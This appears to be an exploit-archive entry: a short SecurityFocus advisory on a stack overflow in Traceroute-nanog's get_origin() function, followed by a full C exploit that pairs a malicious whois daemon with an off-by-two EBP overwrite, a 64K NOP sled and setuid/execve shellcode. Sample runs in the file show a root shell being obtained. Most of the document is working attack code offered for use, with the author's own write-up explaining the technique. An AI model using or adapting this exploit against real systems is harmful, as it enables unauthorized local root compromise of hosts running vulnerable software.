@@ -1,0 +1,465 @@
+source: http://www.securityfocus.com/bid/6166/info
+
+A vulnerability has been discovered in Traceroute-nanog. It has been reported that Traceroute-nanog contains a buffer overflow condition.
+
+The overflow occurs in the 'get_origin()' function in the 'traceroute.c' file. Due to insufficient bounds checking performed by the whois parser, it may be possible to cause 'get_origin()' to corrupt memory on the system stack.
+
+This vulnerability can be exploited by an attacker to gain root privileges on a target host. 
+
+/*
+
+---[ Traceroute-nanog 6.0 -> 6.1.1 exploit ]---
+
+By Carl Livitt (carl@learningshophull.co.uk)
+
+Exploits a stack overflow in get_origin() function of traceroute.c to gain r00t.
+Tested on SuSE 7.1, 7.2, 7.3 & 8.0, but should work on 7.0 and 6.x.
+
+There are lots more overflows in this traceroute implementation... mostly heap
+overflows I think. Have a look, have some fun.
+
+
+---[ About this exploit ]---
+
+Traceroute-nanog can do WHOIS-like DNS lookups at each hop and find the admin email address
+for each IP. It is possible to set environment variables to tell traceroute
+the IP and port number of your own custom DNS server.
+
+Unfortunately, traceroute fails to error-check the returned records, making it possible
+to trick it into causing a stack overflow (but with limitations).
+
+My technique was to write my own malicious server that would inject a carefully
+crafted response to traceroute's query, triggering the overflow and letting
+me obtain local r00t access.
+
+---[ More Info ]---
+
+When get_origin() is called, the stack looks like this:
+
+ char buf[256]     tmp4[100] tmp3[100] tmp2[100]  tmp1[100] EBP EIP 
+[bbbbbbbbbbbbbbbbbb44444444443333333333222222222221111111111BBBBIIII] -> 0xbfffffff
+
+There is an 8k buffer called 'reply' on the heap. Its purpose is to hold the entire
+reply from the  server. It is populated by repeated calls to read(2), each call
+reading 256 bytes into buf[] which are then concatenated into reply[]. Incedentally, 
+no bounds checking is done on reply[], making it possible to cause a heap overflow:
+
+count = 0;
+        while ((n = read(s, buf, sizeof(buf))) > 0) {
+            strcpy((char *)&reply[count],(char *)buf);
+            count += n;
+        }
+
+After reading the entire reply into reply[], get_origin() then parses the contents;
+this is where the lack of bounds checking becomes apparent:
+
+rp = (char *)reply; 
+        origin[0]='\0';
+        reply[MAXREPLYLEN-1]='\0';
+
+        rp = (char *)strstr(rp,tmp2);   
+        while (rp != 0) {               
+                                        
+           pp = (char *)strstr(rp,tmp3);        
+           if (pp == 0) {               
+              prefix = 0;               
+           } else {
+              prefix = atoi(pp+1);      
+           }
+
+           if (prefix >= best_prefix) { 
+              i = (char *)strstr(pp,tmp);       
+              if (i != 0) {                     
+                 i += strlen(DATA_DELIMITER);   
+                 i++;                           
+                 while (*i == ' ') i++;         
+                 
+                 j = i;                         
+                 while (*j >= '0') j++;	// CHAR FILTERING
+                 if (prefix > best_prefix) {
+                    strcpy(origin,"/");         
+                    best_prefix = prefix;               
+                 } else {
+                    strcat(origin,"/");         
+                 }
+                 strncpy(tmp4,i,(j-i)); // OVERFLOW
+                 tmp4[j-i] = '\0';              
+                 if (!(strstr(origin,tmp4))) {  
+                    strncat(origin,i,(j-i));    
+                 } else {
+                    if (prefix == best_prefix)  
+                       origin[strlen(origin)-1] = '\0';
+                 } 
+              } 
+           } 
+           rp = (char *)strstr(rp+1,tmp2);      
+        }  
+
+get_origin() finds the word 'route:' in reply[], then reads the number that follows 
+it. If the number is greater than best_prefix (zero), then get_origin() continues to 
+parse the reply[] buffer. It sets two pointers (*i, *j) to just past the location of 
+the string 'origin:', and then increments *j until a character < ASCII '0' is found. 
+
+So, *i marks the start of the buffer to copy into tmp4[] and *j marks the end of the
+buffer. Because tmp4[] is 100 bytes long and it is possible to construct a reply of 
+arbitrary length, it is trivial to overflow tmp4[], tmp3[], tmp2[] and tmp1[], over-
+writing values on the stack.
+
+To exploit this overflow is not quite that simple, however. To redirect the flow of
+execution, the EIP saved on the stack needs to be overwritten with a value such as
+0xbfff4567; the problem is that while the chars 0x67 and 0x45 pass the filter
+mentioned above (*j >='0'), the chars 0xbf and 0xff do not (j is of type 'char'. Valid
+values that pass through the filter are 0x30 -> 0x7f). If 0xffbf was to be embedded 
+into the reply[] buffer as part of the overflow data, processing of the reply would 
+stop and the tmp4[] buffer would not be overflowed.
+
+This means that we cannot directly affect EIP. That leaves EBP. Again we face the same
+problem: we can only overwrite EBP with values in the range 0x30 -> 0x7f.... and one
+other: NULL (0x00). The NULL byte cannot pass through the filter if placed there by an
+attacker, but it doesn't matter because get_origin() NULL-terminates the tmp4[] buffer
+for us.
+
+So, it is possible to do an off-by-one attack (or off-by-two; more on that later) by
+using the NULL byte to overflow the least-significant byte of the saved EBP. There's
+only one more problem to overcome: we still need to get a malicious EIP value onto the
+stack somewhere it can be reached via an off-by-one attack. However, we can't place
+the EIP into the exploit buffer, because the 0xbfffxxxx will not pass through the filter.
+Luckily, the reply[] buffer is populated by copying from the stack to the heap via the
+buf[] buffer in 256 bytes chunks until there is no more data to copy. We can (ab)use 
+this behaviour by writing the exact amount of data into reply[] (via buf[]) that is
+needed to cause the overflow, then write a value less than '0' which will stop 
+get_origin() processing the exploit buffer and then we can write as many bytes as we
+like into buf[] (up to 256) _of any value we like_.
+
+All of this can be put together to form an exploit string that will overflow EBP, 
+fill buf[] with our evil EIP and let us execute arbitrary shellcode (stored in an
+environment variable on the stack).
+
+The trouble with this technique is that an off-by-one exploit only gives us one
+possible location on the stack to find our evil EIP (remember, it's in buf[]). It
+is not possible to reach _any_ address in buf[] using an off-by-one because buf[] is
+located too far away on the stack. Even by padding out the stack with environment
+variables to alter ESP doesn't work: we can't reach buf[]. However, it IS possible
+to use an off-by-two attack:
+
+Off-by-one:
+-----------
+0xbffffabc becomes 0xbffffa00
+
+Off-by-two:
+-----------
+0xbffffabc becomes 0xbfff00nn where nn is any value in range 0x30 -> 0x7f.
+
+Aha! Now we've got a lot more flexibility in how we can reach buf[], and thus EIP.
+All that is needed is to pad the stack by about 64K so that buf[] is located near
+0xbfff00nn. This is accomplished by using an enormous environment variable to hold
+our shellcode... in the exploit code I use about 64K of NOPs to do the trick. This
+has the added bonus that it's difficult to miss 64K of NOPs when jumping to shellcode!
+
+This exploit was very interesting to write. A couple of times I threw my hands up in
+disgust as I thought it was not going to be possible to execute shellcode... but it
+just goes to show what a little coffee and lateral thinking can do. 
+
+
+---[ Usage ]---
+
+First, you must start the malicious daemon that will answer traceroute's query. It 
+can run on the same machine as you are exploiting, or on a different one... it makes
+no difference. Then, you run the exploit which will start traceroute with the 
+correct environment variables to cause the overflow:
+
+Example 1:
+--------------
+
+carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -d
+Now run this exploit with the '-e' flag.
+carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -e
+traceroute to www.yahoo.akadns.net (66.218.71.80), 30 hops max, 40 byte packets
+ 1 sh-2.05# id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.05#
+
+
+Example 2:
+--------------
+
+carl@testingserver:/tmp > /sbin/ifconfig eth0 |grep inet
+          inet addr:192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0
+carl@testingserver:/tmp > ./traceroute-exploit -d
+Now run this exploit with the '-e' flag.
+
+
+carl@titan:~/exploits/nanog-6.1.1 > ./traceroute-exploit -e -s 192.168.1.100
+traceroute to www.yahoo.akadns.net (64.58.76.179), 30 hops max, 40 byte packets
+ 1 sh-2.05# id
+uid=0(root) gid=100(users) groups=100(users),102(wwwrun)
+sh-2.05#
+
+
+Note that you _must_ run this exploit in '-d' (daemon) mode first, otherwise the
+traceroute will just run as normal and you'll never be able to exploit it.
+
+---[ Thats all folks ]---
+
+Maybe this exploit has bugs, maybe not. Who knows for sure? Who cares, it's an
+exploit that does what I needed and no more. Maybe I'll spend time refining it
+later.
+
+On that note, if you make any additions/bugfixes/changes, then please mail copies
+of the source back to me... thanks.
+
+Have a nice r00t,
+Carl.
+*/
+
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <malloc.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#define _GNU_SOURCE
+#include <getopt.h>
+
+// Sensible defaults that work on SuSE 7.x & 8.0 (possibly others)
+#define BUFSIZE 64128
+#define RA_SERVER "localhost"
+#define RA_SERVICE "ap"
+#define TRACEROUTE "/usr/sbin/traceroute"
+#define FLAGS "-nOA"
+#define TRACE_HOST "www.yahoo.com"
+#define NOT_SET 0
+#define DAEMON 1
+#define EXPLOIT 2
+#define EXPLOIT_START "xxxxroute: /1 origin:111"
+#define RET_ADDR 0xbfff4444
+
+void do_daemon(char *service);
+void run_daemon(char *service);
+
+char shellcode[] =
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" // setuid(0)
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh"; // aleph1 execve() of /bin/sh
+
+char usage[] =
+"\ntraceroute-exploit - By Carl Livitt (carl@learningshophull.co.uk)\n"
+"Exploits traceroute-nanog 6.0 -> 6.1.1 and others on SuSE 7.x/8.0\n\n"
+"Usage:\n"
+"      ./traceroute-exploit < -d | -e > [ options ]\n\n"
+"Options:\n"
+"-d             Run in daemon mode (stage 1)\n"
+"-e             Run in exploit mode (stage 2)\n"
+"-h             Display this help\n"
+"-H host        Traceroute to 'host' [www.yahoo.com]\n"
+"-s server      Specify host running exploit daemon [localhost]\n"
+"-S service     Name of service port on exploit daemon host [ap]\n"
+"               ap = port 47806/tcp (see /etc/services)\n"
+"-t filename    Full path to traceroute binary [/usr/sbin/traceroute]\n"
+"-b bufsize     Size of shellcode buffer [64128]\n"
+"-v             Be verbose\n\n"
+"Example (works on SuSE 7.x/8.0):\n"
+"      ./traceroute-exploit -d\n"
+"      ./traceroute-exploit -e\n\n"
+"Example 2 (uses mysql port(3306)):\n"
+"      ./traceroute-exploit -d -S mysql\n"
+"      ./traceroute-exploit -e -S mysql\n\n";
+
+extern char *optarg;
+extern int optind, opterr, optopt;
+
+main(int argc, char **argv) {
+        char *env[4];
+        char *traceroute[4];
+        char host[256], server[256], service[256],filename[256];
+        int bufsize, verbose=0;
+        int c,exploitMode=NOT_SET;
+        char *buf;
+        char tmp[256];
+
+		// some sensible defaults that work out-of-the-box
+        strncpy(host, TRACE_HOST, 255);
+        strncpy(server, RA_SERVER, 255);
+        strncpy(service, RA_SERVICE, 255);
+        strncpy(filename, TRACEROUTE, 255);
+        bufsize=BUFSIZE;
+
+        // process command-line args
+		while((c=getopt(argc,argv,"vdehH:s:S:t:b:"))!=-1) {
+                switch(c) {
+                        case 'd':
+                                exploitMode=DAEMON;
+                                break;
+                        case 'e':
+                                exploitMode=EXPLOIT;
+                                break;
+                        case 'v':
+                                verbose=1;
+                                break;
+                        case 'H':
+                                strncpy(host,optarg,255);
+                                break;
+                        case 'h':
+                                printf(usage);
+                                break;
+                        case 's':
+                                strncpy(server,optarg,255);
+                                break;
+                        case 'S':
+                                strncpy(service,optarg,255);
+                                break;
+                        case 't':
+                                strncpy(filename,optarg,255);
+                                break;
+                        case 'b':
+                                bufsize=atoi(optarg);
+                                break;
+                        default:
+                                printf(usage);
+                                exit(0);
+                                break;
+                }
+        }
+        
+		// make sure the attacker knows what he/she/cowboyneal is doing
+		if(exploitMode==NOT_SET) {
+                printf("You must specify at least '-d' or '-e'. Type '%s -h' for help.\n", argv[0]);
+                exit(0);
+        }
+
+		// run the malicious, evil daemon and return the attacker to a shell.
+        if(exploitMode==DAEMON) {
+                // this function will never return.
+				do_daemon(service);
+        }
+
+        // Now run traceroute, making it connect to the malicious daemon.
+		
+		// Allocate our shellcode buffer.
+		// This buffer pads the stack by about 64K
+		// which makes the off-by-two attack possible
+		if((buf=(char *)malloc(bufsize))==NULL) {
+                perror("Out of memory??!??!?!?: ");
+                exit(1);
+        }
+
+        // fill buffer with NOPs
+        memset(buf,(int)0x90,(size_t)bufsize-1);
+
+        // start the environment variable
+        memcpy(buf,"SHELLCODE=",9);
+
+        // fill end of buffer with shellcode
+        memcpy(buf+bufsize-1-strlen(shellcode), shellcode, strlen(shellcode));
+
+        // null-terminate
+        buf[bufsize-1]='\0';
+
+        // setup the environment etc
+		env[0]=strdup(buf);
+        sprintf(tmp,"RA_SERVER=%s",server);env[1]=strdup(tmp);
+        sprintf(tmp,"RA_SERVICE=%s",service);env[2]=strdup(tmp);
+        env[3]=NULL;
+        sprintf(tmp,"%s",filename);traceroute[0]=strdup(tmp);
+        sprintf(tmp,"%s",FLAGS);traceroute[1]=strdup(tmp);
+        sprintf(tmp,"%s",host);traceroute[2]=strdup(tmp);
+        traceroute[3]=NULL;
+		free(buf);
+
+        // spawn traceroute and gain r00t in the process...
+        execve(*traceroute, traceroute, env);
+}
+
+// fork, making a daemon listing of port 'service' (ap/47806 by default)
+// and return to shell.
+void do_daemon(char *service) {
+        if(fork()==0) {
+                run_daemon(service);
+        } else {
+                printf("Now run this exploit with the '-e' flag.\n");
+                _exit(0);
+        }
+}
+
+// the daemon itself
+void run_daemon(char *service) {
+        int sock,victim_sock,len,i,j;
+        struct sockaddr_in server_addr;
+        struct sockaddr_in victim_addr;
+        char buf[256];
+        char exploit_string[4096]=EXPLOIT_START;
+        struct servent *sv;
+
+        // make sure the attacker has specified
+		// a valid service name (eg. mysql, ftp, ap etc)		
+		if((sv=getservbyname(service,"tcp"))==NULL) {
+                perror("getservbyname(): ");
+                exit(0);
+        }
+
+        // some magic-number voodoo...
+        // exploit_string will cause an off-by-two overflow in get_origin()
+		// exploit_string:0   'xxxxroute: /1 origin:111'	# tags used by get_origin()
+		// exploit_string:24  'a' x 398						# dummy data
+		// exploit_string:422 '\x7f'						# least-significant byte of EBP
+		// exploit_string:423 '\x01'						# char < '0' to stop processing
+		// exploit_string:424 '\x44\x44\xff\xbb' x 104		# evil EIP containing shellcode
+		// exploit_string:528 '\0'							# NULL terminator
+        memset(exploit_string+24, '\0', 4096-1-24);
+        memset(exploit_string+24, 'a', 398);
+        memset(exploit_string+24+398, '\x7f', 1);
+
+        // the next byte stops get_origin from processing
+        // any more of the exploit string.
+        memset(exploit_string+24+399,'\x01', 4);
+
+        // now we can fill buf[256] with our evil EIP
+        // and bypass the filtering in get_origin(). Yay!
+		// More magic numbers...
+        i=24+399+4;
+        j=i+416;
+        while(i<j) {
+                exploit_string[i++]=(char)RET_ADDR&0xff;
+                exploit_string[i++]=(char)(RET_ADDR>>8)&0xff;
+                exploit_string[i++]=(char)(RET_ADDR>>16)&0xff;
+                exploit_string[i++]=(char)(RET_ADDR>>24)&0xff;
+        }
+
+        // setup TCP socket
+		if((sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))==-1) {
+                perror("socket(): ");
+                exit(1);
+        }
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_addr.s_addr = INADDR_ANY;
+        server_addr.sin_port = sv->s_port;
+        len=sizeof(server_addr);
+
+        if((bind(sock, (struct sockaddr *)&server_addr, len))<0) {
+                perror("bind(): ");
+                exit(1);
+        }
+        if((listen(sock, 1))!=0) {
+                perror("listen(): ");
+                exit(1);
+        }
+        
+		// wait for connect from traceroute...
+		victim_sock=accept(sock, (struct sockaddr *)&victim_addr, &len);
+		
+		// read the IP address that traceroute sends (and ignore it)
+        read(victim_sock, buf, 255);
+        
+		// write exploit string
+		write(victim_sock, exploit_string, strlen(exploit_string));
+        
+		// so long and thanks for all the fish
+		close(victim_sock);
+        close(sock);
+        exit(0);
+}
